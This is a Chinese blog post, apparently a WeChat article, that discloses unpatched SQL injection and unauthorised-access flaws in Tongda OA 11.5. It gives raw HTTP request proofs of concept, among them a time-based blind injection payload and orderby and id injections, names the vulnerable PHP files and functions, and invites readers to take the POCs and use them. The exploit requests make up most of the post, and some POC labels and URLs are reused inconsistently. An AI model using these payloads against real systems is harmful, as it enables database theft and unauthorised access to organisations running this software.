> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/lAm-gzqNguFXhSojFFQxDA)

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqczeflvHvDexuf2BhBEBYlJCdjJS6aVZ0w6ooY5QwK27L2khaJWEOVdw2kunkBTviakCv6QeGxYjHg/640?wx_fmt=png)  

之前曝光过通达 OA 0day 我这里就不曝了，截止到发帖时，下面的漏洞都是未正式公开的。  
**影响范围:**  
我测试的是通达 OA11.5 版本，也就是 2020 年 04 月 17 日发布的，其他版未测，但我想也会有吧。  

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfzOpKyjk6fdIU0IUlDvqzeicw9SWxPJYA0fdNG01pXlFmKK2CKcrP5hrYw4Jo7GrTjXAlLJQztYQw/640?wx_fmt=png)

  
HW 这几天看到大家对通达 OA 的热情度很高，正好今天有空，下载了一个通达 OA 11.5 版本下来做代码审计，通达 OA 的代码是加密的，所以需要一个 SeayDzend 工具解密，百度上就能找到。  

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfzOpKyjk6fdIU0IUlDvqze7XgQDH4wzPeOlOfM9PvbrPNfON2AXJ6NANgjP8ShseA96aYicsJLBFg/640?wx_fmt=png)

  
解密后，对代码的各个模块都大致看了一下，很快就发现多处都存在 SQL 注入漏洞，仔细看了之前的曝光的文章，发现这些漏洞并未曝光，也未预警，也属于 0day 漏洞吧。  
不多说，直接上 POC，有需要的可以先拿到用了。  
**0x001 SQL 注入 POC:**

```
POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
Referer: http://192.168.202.1/portal/home/
Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
Connection: keep-alive
Host: 192.168.43.169
Pragma: no-cache
X-Requested-With: XMLHttpRequest
Content-Length: 154
X-WVS-ID: Acunetix-Autologin/65535
Cache-Control: no-cache
Accept: */*
Origin: http://192.168.43.169
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

starttime=AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])---&endtime=1598918400&view=month&condition=1
```

```
GET /general/email/sentbox/get_index_data.php?asc=0&boxid=&boxname=sentbox&curnum=3&emailtype=ALLMAIL&keyword=sample%40email.tst&orderby=1&pagelimit=20&tag=×tamp=1598069133&total= HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: http://192.168.43.169/
Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Host: 192.168.43.169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
Connection: close
```

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfzOpKyjk6fdIU0IUlDvqze2yAzOLh0FOkvosfiakQbba3Z25q5qBmDkfHLL9Sjh0yUt5YlIMIQvVw/640?wx_fmt=png)

  
漏洞文件：**webroot\general\appbuilder\modules\calendar\models\Calendar.php**。  
**get_callist_data 函数**接收传入的 begin_date 变量未经过滤直接拼接在查询语句中造成注入。  

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfzOpKyjk6fdIU0IUlDvqzeDKkatI0iaBTU24z3IQzibMXXqUOKB6I5ncegro0emt4WEicebE0nS1fDA/640?wx_fmt=png)

  
利用条件：  
一枚普通账号登录权限，但测试发现，某些低版本也无需登录也可注入。  
  
**0x002 SQL 注入 POC:**  
漏洞参数：orderby

```
GET /general/email/inbox/get_index_data.php?asc=0&boxid=&boxname=inbox&curnum=0&emailtype=ALLMAIL&keyword=&orderby=3--&pagelimit=10&tag=×tamp=1598069103&total= HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: http://192.168.43.169
Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Host: 192.168.43.169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
Connection: close
```

```
GET /general/appbuilder/web/report/repdetail/edit?link_type=false&slot={}&id=2 HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: http://192.168.43.169
Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Host: 192.168.43.169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
Connection: close
```

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfzOpKyjk6fdIU0IUlDvqzeDg091gE75tECVbibE34IhgfVkjGCtbUNxoFicRavFE05tea3w2ibia3Raw/640?wx_fmt=png)

  
漏洞文件：**webroot\inc\utility_email.php，get_sentbox_data** 函数接收传入参数未过滤，直接拼接在 order by 后面了造成注入。  

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfzOpKyjk6fdIU0IUlDvqzehckfYRW7zz0ot4D1LZtWn4P6tSUY76OKf1aqMLnwBGSVng1vCOEI5Q/640?wx_fmt=png)

  
利用条件：  
一枚普通账号登录权限，但测试发现，某些低版本也无需登录也可注入。  
**0x003 SQL 注入 POC:**  
漏洞参数：orderby

```
http://127.0.0.1/general/calendar/arrange/get_cal_list.php?starttime=1548058874&endtime=1597997506&view=agendaDay
```

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfzOpKyjk6fdIU0IUlDvqzePPkZibq0xSQS2eias6Z96ia1RAOWHeXN44p5npiazeNbKL0meNWaWjzmlA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfzOpKyjk6fdIU0IUlDvqzeoWYBtVopj5cmicr8EOnQ9ynuFjPxbYcPp7P6RJfJMyH0j3J4mNUajww/640?wx_fmt=png)

  
漏洞文件：**webroot\inc\utility_email.php，get_email_data** 函数传入参数未过滤，直接拼接在 order by 后面了造成注入。  

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfzOpKyjk6fdIU0IUlDvqzeX8FvlVwSgyG3xPsiaJGdfWrhaSaOeARhczPC64yMefet5Hep79vgnwA/640?wx_fmt=png)

  
利用条件：  
一枚普通账号登录权限，但测试发现，某些低版本也无需登录也可注入。  
**0x004 SQL 注入 POC:**  
漏洞参数：id

```
GET /general/appbuilder/web/report/repdetail/edit?link_type=false&slot={}&id=2 HTTP/1.1
X-Requested-With: XMLHttpRequest
Referer: http://192.168.43.169
Cookie: PHPSESSID=54j5v894kbrm5sitdvv8nk4520; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=c9e143ff
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate
Host: 192.168.43.169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36
Connection: close
```

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfzOpKyjk6fdIU0IUlDvqzeyKO5AMreuTmE1WezwZMLcmorP61XtLqYiakP44Exm8oapECOR3u9z3A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfzOpKyjk6fdIU0IUlDvqzensMDET1UxFhvmibh55SFBJhdEZHFib0nHyPBaACfYibVszR2fcgQmdE9Q/640?wx_fmt=png)

  
漏洞文件：**webroot\general\appbuilder\modules\report\controllers\RepdetailController.php**，**actionEdit 函数**中存在 一个 $_GET["id"];  未经过滤，拼接到 SQL 查询中，造成了 SQL 注入。  

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfzOpKyjk6fdIU0IUlDvqzeZicX69dWonCYQyLKwWZibBp4ew3FMPetbLBj6Hf3C8NUxCqAEztC739g/640?wx_fmt=png)

  
利用条件：  
一枚普通账号登录权限，但测试发现，某些低版本也无需登录也可注入。  
**0x005 未授权访问:**  
未授权访问各种会议通知信息，POC 链接：

```
http://127.0.0.1/general/calendar/arrange/get_cal_list.php?starttime=1548058874&endtime=1597997506&view=agendaDay
```

![](https://mmbiz.qpic.cn/mmbiz_png/RpxgdDjibJqfzOpKyjk6fdIU0IUlDvqzeXTmMMxwAwFUlsrVgMIOg73mImFbJiar6CLYAmwbDJFLBgUcStC7kXxg/640?wx_fmt=png)  

**END.**

**欢迎转发~**

**欢迎关注~**

**欢迎点赞~**

![](https://mmbiz.qpic.cn/mmbiz_jpg/5u08OUQmyqfuiaa3cgiaOkcI5vVcZ3WNmgaNLTjw3ecUQWWfS1CUaKYuXeHzyHvT4zRVOLkfOV1YxZFpxGHxMQ5A/640?wx_fmt=jpeg)